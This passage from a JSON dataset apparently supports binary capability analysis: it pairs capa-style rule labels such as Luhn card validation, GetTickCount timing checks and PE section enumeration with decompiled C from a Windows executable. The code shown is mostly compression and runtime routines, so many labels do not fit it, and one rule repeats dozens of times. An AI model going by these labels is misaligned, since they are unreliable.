0x1900 + in_EAX, \n                uVar2 < *puVar1 || uVar2 == *puVar1)))) break;\n            *(in_EAX + 0x1004 + arg_8h * 4) = iVar7;\n            iVar6 = *(in_EAX + 0x18f8);\n            iVar8 = iVar9 * 2;\n            bVar10 = SBORROW4(iVar8, iVar6);\n            iVar7 = iVar8 - iVar6;\n            arg_8h = iVar9;\n        } while (iVar8 <= iVar6);\n    }\n    *(in_EAX + 0x1004 + arg_8h * 4) = iVar5;\n    return;\n}\n",
        "token_count": 672
    },
    "0041a4b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.0041a4b2(int32_t arg_8h, int32_t arg_ch)\n\n{\n    ushort uVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_ESI;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    iVar6 = 0;\n    iVar3 = 0;\n    iVar5 = 1;\n    piVar2 = arg_8h + 0xfe4;\n    do {\n        iVar3 = (*piVar2 + iVar3) * 2;\n        *(&var_24h + iVar5 * 2) = iVar3;\n        iVar5 = iVar5 + 1;\n        piVar2 = piVar2 + 1;\n    } while (iVar5 < 0x10);\n    if (-1 < arg_ch) {\n        do {\n            uVar4 = *(unaff_ESI + 2 + iVar6 * 4);\n            if (uVar4 != 0) {\n                piVar2 = &var_24h + uVar4 * 2;\n                iVar3 = *piVar2;\n                *piVar2 = iVar3 + 1;\n                uVar1 = fcn.0041ae99(iVar3, uVar4);\n                *(unaff_ESI + iVar6 * 4) = uVar1;\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 <= arg_ch);\n    }\n    fcn.0041e0a1(var_24h);\n    return;\n}\n",
        "token_count": 402
    },
    "0041a8f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a8f8(uint arg_8h, int32_t arg_ch)\n\n{\n    uint16_t *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_EDI;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    \n    iVar7 = arg_ch;\n    fcn.0041ae0c(5);\n    fcn.0041ae0c(5);\n    fcn.0041ae0c(4);\n    arg_ch = 0;\n    if (0 < unaff_EDI) {\n        do {\n            fcn.0041ae0c(3);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < unaff_EDI);\n    }\n    fcn.0041a7cb();\n    uVar8 = 0xffffffff;\n    uVar5 = *(in_EAX + 0x90a);\n    iVar4 = 0;\n    iVar2 = 7;\n    iVar9 = 4;\n    if (uVar5 == 0) {\n        iVar2 = 0x8a;\n        iVar9 = 3;\n    }\n    if (-1 < iVar7 + -1) {\n        puVar1 = in_EAX + 0x90e;\n        do {\n            uVar3 = *puVar1;\n            iVar4 = iVar4 + 1;\n            if ((iVar2 <= iVar4) || (uVar5 != uVar3)) {\n                if (iVar4 < iVar9) {\n                    do {\n                        fcn.0041ae0c(*(in_EAX + 0xef6 + uVar5 * 4));\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                else {\n                    if (uVar5 == 0) {\n                        if (iVar4 < 0xb) {\n                            fcn.0041ae0c(*(in_EAX + 0xf3a));\n                            uVar6 = 3;\n                        }\n                        else {\n                            fcn.0041ae0c(*(in_EAX + 0xf3e));\n                            uVar6 = 7;\n                        }\n                    }\n                    else {\n                        if (uVar5 != uVar8) {\n                            fcn.0041ae0c(*(in_EAX + 0xef6 + uVar5 * 4));\n                        }\n                        fcn.0041ae0c(*(in_EAX + 0xf36));\n                        uVar6 = 2;\n                    }\n                    fcn.0041ae0c(uVar6);\n                }\n                iVar4 = 0;\n                uVar8 = uVar5;\n                if (uVar3 == 0) {\n                    iVar2 = 0x8a;\n                }\n                else {\n                    if (uVar5 != uVar3) {\n                        iVar2 = 7;\n                        iVar9 = 4;\n                        goto code_r0x0041a8e6;\n                    }\n                    iVar2 = 6;\n                }\n                iVar9 = 3;\n            }\ncode_r0x0041a8e6:\n            uVar5 = uVar3;\n            puVar1 = puVar1 + 2;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n    }\n    return;\n}\n",
        "token_count": 764
    },
    "0041ae0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ae0c(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[0x6bd7];\n    unaff_ESI[0x6bdb] = unaff_ESI[0x6bdb] + param_1;\n    iVar3 = param_1 + iVar2;\n    unaff_ESI[0x6bd7] = iVar3;\n    unaff_ESI[0x6bd6] = unaff_ESI[0x6bd6] | in_EAX << (iVar2 & 0x1f);\n    if (0x10 < iVar3) {\n        puVar1 = unaff_ESI + 0x6bd9;\n        if (unaff_ESI[0x6bda] - 1 <= *puVar1) {\n            (*unaff_ESI[4])(*unaff_ESI, unaff_ESI[0x6bd8], puVar1);\n        }\n        *(unaff_ESI[0x6bd8] + *puVar1) = *(unaff_ESI + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + unaff_ESI[0x6bd8]) = *(unaff_ESI + 0x1af59);\n        unaff_ESI[0x6bd7] = unaff_ESI[0x6bd7] + -0x10;\n        *puVar1 = *puVar1 + 1;\n        unaff_ESI[0x6bd6] = in_EAX >> (param_1 - unaff_ESI[0x6bd7] & 0x1fU);\n    }\n    return;\n}\n",
        "token_count": 419
    },
    "0041aeb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041aeb8(void)\n\n{\n    uint32_t *puVar1;\n    uint *in_EAX;\n    \n    if (in_EAX[0x6bd7] < 9) {\n        if (in_EAX[0x6bd7] < 1) goto code_r0x0041af45;\n        puVar1 = in_EAX + 0x6bd9;\n        if (in_EAX[0x6bda] <= *puVar1) {\n            (*in_EAX[4])(*in_EAX, in_EAX[0x6bd8], puVar1);\n        }\n        *(in_EAX[0x6bd8] + *puVar1) = *(in_EAX + 0x6bd6);\n    }\n    else {\n        puVar1 = in_EAX + 0x6bd9;\n        if (in_EAX[0x6bda] - 1 <= *puVar1) {\n            (*in_EAX[4])(*in_EAX, in_EAX[0x6bd8], puVar1);\n        }\n        *(in_EAX[0x6bd8] + *puVar1) = *(in_EAX + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + in_EAX[0x6bd8]) = *(in_EAX + 0x1af59);\n    }\n    in_EAX[0x6bd9] = in_EAX[0x6bd9] + 1;\ncode_r0x0041af45:\n    if (in_EAX[0x6bd5] != 0) {\n        (*in_EAX[4])(*in_EAX, in_EAX[0x6bd8], in_EAX + 0x6bd9);\n    }\n    in_EAX[0x6bd6] = 0;\n    in_EAX[0x6bd7] = 0;\n    in_EAX[0x6bdb] = in_EAX[0x6bdb] + 7 & 0xfffffff8;\n    return;\n}\n",
        "token_count": 473
    },
    "0041c758": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041c758(void)\n\n{\n    int32_t in_EAX;\n    uint32_t unaff_ESI;\n    \n    if (*(in_EAX + 0x1c) == '\\0') {\n        *(in_EAX + 0x14) = 0x2000000;\n    }\n    else if (*(in_EAX + 0x20) == 0) {\n        if (*(in_EAX + 4) != 0) {\n            (**0x44635c)(*(in_EAX + 4), *(in_EAX + 0x10) + unaff_ESI, 0, 0);\n            return 1;\n        }\n        *(in_EAX + 0x14) = 0x1000000;\n    }\n    else {\n        if (unaff_ESI < *(in_EAX + 0x28)) {\n            *(in_EAX + 0x24) = unaff_ESI;\n            return 1;\n        }\n        *(in_EAX + 0x14) = 0x30000;\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "0041cb20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041cb20(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint32_t uVar4;\n    \n    if (*(unaff_ESI + 0x84) == 0) {\n        if (*(unaff_ESI + 0x7c) == 0) {\n            *(unaff_ESI + 0x14) = 0x1000000;\n        }\n        else {\n            iVar3 = (**0x446468)(*(unaff_ESI + 0x7c));\n            if (iVar3 != 0) goto code_r0x0041cb5b;\n        }\n    }\n    else {\n        uVar1 = *(unaff_ESI + 0x8c);\n        if (uVar1 < *(unaff_ESI + 0x88)) {\n            uVar4 = *(unaff_ESI + 0x88) - uVar1;\n            if (arg_8h < uVar4) {\n                uVar4 = arg_8h;\n            }\n            arg_8h = uVar4;\n            fcn.00420150(unaff_EBX, uVar1 + *(unaff_ESI + 0x84), arg_8h);\n            *(unaff_ESI + 0x8c) = *(unaff_ESI + 0x8c) + arg_8h;\ncode_r0x0041cb5b:\n            *(unaff_ESI + 0x74) = *(unaff_ESI + 0x74) + arg_8h;\n            uVar2 = fcn.0041c18f();\n            *(unaff_ESI + 0x78) = uVar2;\n            return arg_8h;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 423
    },
    "0041cbe1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041cbe1(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 0x48) == 0) {\n        iVar1 = fcn.0041e85d(0x6afa8);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.00419f05();\n            *(iVar1 + 0x6af70) = 0;\n        }\n        *(unaff_ESI + 0x48) = iVar1;\n    }\n    *(*(unaff_ESI + 0x48) + 0x6afa4) = 0;\n    *(*(unaff_ESI + 0x48) + 0xc) = 0x41cb08;\n    *(*(unaff_ESI + 0x48) + 0x10) = 0x41c667;\n    **(unaff_ESI + 0x48) = unaff_ESI;\n    *(*(unaff_ESI + 0x48) + 4) = 8;\n    *(*(unaff_ESI + 0x48) + 8) = *(unaff_ESI + 0x6c);\n    *(*(unaff_ESI + 0x48) + 0x6afa4) = 0;\n    *(*(unaff_ESI + 0x48) + 0xe7e) = 0;\n    *(*(unaff_ESI + 0x48) + 0x6af70) = 0;\n    iVar1 = *(unaff_ESI + 0x48);\n    *(iVar1 + 0x1af60) = unaff_ESI + 0x94;\n    *(iVar1 + 0x1af68) = 0x4000;\n    *(iVar1 + 0x1af64) = 0;\n    *(iVar1 + 0x1af54) = 1;\n    *(iVar1 + 0x1af58) = 0;\n    *(iVar1 + 0x1af5c) = 0;\n    *(iVar1 + 0x1af6c) = 0;\n    fcn.00419fcc();\n    fcn.0041b06a(param_1 + 4);\n    uVar2 = fcn.0041b5ff();\n    *(unaff_ESI + 0x90) = uVar2;\n    uVar2 = 0;\n    if (*(*(unaff_ESI + 0x48) + 0x6afa4) != 0) {\n        uVar2 = 0x5000000;\n    }\n    return uVar2;\n}\n",
        "token_count": 617
    },
    "0041dc45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dc45(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.004216ec(arg_8h, *(arg_ch * 4 + 0x4342d8), arg_10h);\n    return;\n}\n",
        "token_count": 66
    },
    "004233cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004233cc(uint arg_8h)\n\n{\n    fcn.0042328c(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "00427bf9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00427c0d)\n// WARNING: Removing unreachable block (ram,0x00427c13)\n// WARNING: Removing unreachable block (ram,0x00427c15)\n\nvoid fcn.00427bf9(void)\n\n{\n    return;\n}\n",
        "token_count": 65
    },
    "0042de40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042de40(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x440378, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.004221b6();\n        *puVar1 = 0x16;\n        fcn.00423a7a();\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0042d70c(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0042ded6();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 442
    },
    "0042df04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042df04(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0042de40(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 78
    },
    "0041dbeb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041dbeb(int32_t *param_1)\n\n{\n    if (*param_1 < 4) {\n        fcn.0041e03e(*param_1 * 0x18 + 0x444b08);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "0042053e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042053e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00422e07(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004042ed": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004042ed(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(param_1 + 0x14) - *(param_1 + 0x10) < *(in_EAX + 0x10)) &&\n       (*(param_1 + 0x10) <= *(in_EAX + 0x14) - *(in_EAX + 0x10))) {\n        fcn.0040444d(0);\n    }\n    else {\n        fcn.004043b8(in_EAX, 0);\n    }\n    fcn.00403ef2();\n    return;\n}\n",
        "token_count": 143
    },
    "00408ca8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ca8(uint arg_8h, uchar *arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_570h;\n    uint var_56ch;\n    int32_t *var_568h;\n    int32_t *var_564h;\n    uint var_560h;\n    uint var_420h;\n    uint var_318h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    *arg_ch = 0;\n    arg_8h_00 = 0x4341b0;\n    var_564h = NULL;\n    iVar1 = (**0x446364)(0x4341c0, 0, 1, 0x4341b0, &var_564h);\n    if (-1 < iVar1) {\n        var_568h = NULL;\n        (***var_564h)(var_564h, 0x4341d0, &var_568h);\n        (**0x446320)(0, 0, arg_8h, 0xffffffff, &var_318h, 0x104);\n        iVar1 = (**(*var_568h + 0x14))(var_568h, &var_318h, 0);\n        if ((((-1 < iVar1) && (iVar1 = (**(*var_564h + 0x4c))(var_564h, 0, 1),  -1 < iVar1)) &&\n            (iVar1 = (**(*var_564h + 0xc))(var_564h, &var_110h, 0x104, &var_560h, 4),  -1 < iVar1)) &&\n           (iVar1 = (**(*var_564h + 0x18))(var_564h, &var_420h, 0x104),  -1 < iVar1)) {\n            (**0x446424)(arg_ch, &var_110h, 0x104);\n        }\n    }\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 486
    },
    "0040c377": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040c377(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U <= unaff_EBX) {\n        iVar2 = fcn.0041d5a6(\"string too long\");\n    }\n    if (unaff_EBX != 0) {\n        iVar2 = iVar2 + unaff_EBX;\n        cVar1 = fcn.004040c2(iVar2, 0);\n        if (cVar1 != '\\0') {\n            fcn.0040c12d();\n            unaff_ESI[4] = iVar2;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "0040e46a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e46a(char *arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    uint arg_ch;\n    code *var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = NULL;\n    if (arg_8h == '\\0') goto code_r0x0040e480;\n    arg_ch = 0;\n    do {\n        fcn.00420046(arg_8h_00, arg_ch);\n        in_ECX = extraout_ECX;\ncode_r0x0040e480:\n        uVar1 = *(in_ECX + 0x10) & *(in_ECX + 0xc);\n        if ((uVar1 & 4) == 0) {\n            if ((uVar1 & 2) == 0) {\n                uVar2 = fcn.0041d70b();\n                arg_8h = \"ios_base::eofbit set\";\n            }\n            else {\n                uVar2 = fcn.0041d70b();\n                arg_8h = \"ios_base::failbit set\";\n            }\n        }\n        else {\n            uVar2 = fcn.0041d70b();\n            arg_8h = \"ios_base::badbit set\";\n        }\n        fcn.0041e206(&arg_8h);\n        var_8h = 1;\n        var_14h = vtable.std::ios_base::failure.0;\n        arg_ch = 0x44046c;\n        arg_8h_00 = &var_14h;\n        var_4h = uVar2;\n    } while( true );\n}\n",
        "token_count": 401
    },
    "004169b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004169b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *unaff_ESI;\n    uint arg_8h_00;\n    uint var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    iVar1 = (**0x44649c)(0x410, 0, arg_8h);\n    if (iVar1 != 0) {\n        (**0x4464d8)(iVar1, 0, &var_108h, 0x104);\n        (**0x446344)(iVar1);\n    }\n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    fcn.00403f50(&var_108h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 244
    },
    "004218ae": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004218ae(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0041e0b0(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00404397": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404397(uint param_1)\n\n{\n    uchar *unaff_ESI;\n    \n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    fcn.00404029(param_1, 0, 0xffffffff);\n    return;\n}\n",
        "token_count": 88
    },
    "0040e09b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0040e09b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.00420895(0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.0041dbc3(0);\n    *(unaff_EBP + -4) = 0;\n    *(arg_8h_00 + 4) = 0;\n    *(arg_8h_00 + 8) = 0;\n    *(arg_8h_00 + 0xc) = 0;\n    *(arg_8h_00 + 0x10) = 0;\n    *(arg_8h_00 + 0x14) = 0;\n    *(arg_8h_00 + 0x18) = 0;\n    *(arg_8h_00 + 0x1c) = 0;\n    *(arg_8h_00 + 0x20) = 0;\n    *(unaff_EBP + -4) = 4;\n    if (*(unaff_EBP + 0xc) == 0) {\n        *(unaff_EBP + 0xc) = \"bad locale name\";\n        fcn.0041e206(unaff_EBP + 0xc);\n        *(unaff_EBP + -0x18) = vtable.std::runtime_error.0;\n        fcn.00420046(unaff_EBP + -0x18, 0x440410);\n    }\n    fcn.0041d9ea(arg_8h_00, *(unaff_EBP + 